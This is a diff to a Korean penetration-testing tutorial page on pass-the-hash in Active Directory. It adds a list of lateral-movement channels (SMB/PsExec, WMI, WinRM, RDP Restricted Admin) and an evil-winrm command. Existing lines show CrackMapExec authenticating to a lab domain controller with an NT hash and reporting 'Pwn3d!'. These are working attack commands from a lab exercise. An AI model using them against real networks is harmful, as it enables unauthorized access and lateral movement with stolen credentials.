@@ -8,9 +8,18 @@ NTLM 인증이 이뤄지는 동안 유저의 평문 비밀번호는 사용되지
 
 공격자의 입장에서도 마찬가지다. LSASS 덤프 (TODO: 페이지 생성 + 링크)를 진행하다 보면 유저의 NT 해시를 얻을 때가 많다. 경우에 따라서 크래킹이 가능한 경우도 있지만, 비밀번호가 복잡하고 길때는 불가능할때도 많다. 하지만 NTLM 인증 프로토콜은 평문 비밀번호가 필요 없는 프로토콜이다. 더 정확하게는 평문 비밀번호를 굳이 알아낼 필요가 없다. NT 해시만 있으면 된다.&#x20;
 
+패스 더 해시는 원격 코드 실행 및 횡적이동에서 많이 사용된다.&#x20;
+
+* SMB + PsExec&#x20;
+* WMI&#x20;
+* WinRM&#x20;
+* RDP - 단, Restricted Admin (`HKLM\System\CurrentControlSet\Control\LSA, DisableRestrictedAdmin` 이 0이여야함)&#x20;
+
+등의 횡적 이동을 할 때 모두 평문 비밀번호 대신 패스 더 해시를 이용할 수 있다.&#x20;
+
 ### 실습&#x20;
 
-많은 윈도우 + 리눅스 기반의 액티브 디렉토리 툴들은 기본적으로 패스 더 해시를 지원한다. 예를 들어 impacket, CrackMapExec, Rubeus, Mimikatz 등이 있지만, 거의 왠만한 툴들은 다 지원한다고 보면 된다.&#x20;
+많은 윈도우 + 리눅스 기반의 액티브 디렉토리 툴들은 기본적으로 패스 더 해시를 지원한다.예를 들어 impacket, CrackMapExec, Rubeus, Mimikatz 등이 있지만, 거의 왠만한 툴들은 다 지원한다고 보면 된다.&#x20;
 
 {% tabs %}
 {% tab title="리눅스" %}
@@ -38,6 +47,9 @@ SMB         192.168.40.150  445    DC01             [+] choi.local\Administrator
 cme smb 192.168.40.150 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe -d choi.local 
 SMB         192.168.40.150  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:choi.local) (signing:True) (SMBv1:False)
 SMB         192.168.40.150  445    DC01             [+] choi.local\Administrator:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe (Pwn3d!)
+
+# WinRM을 이용한 패스 더 해시 
+evil-winrm -i <ip> -u <user> -H <NThash> 
 ```
 {% endtab %}
 
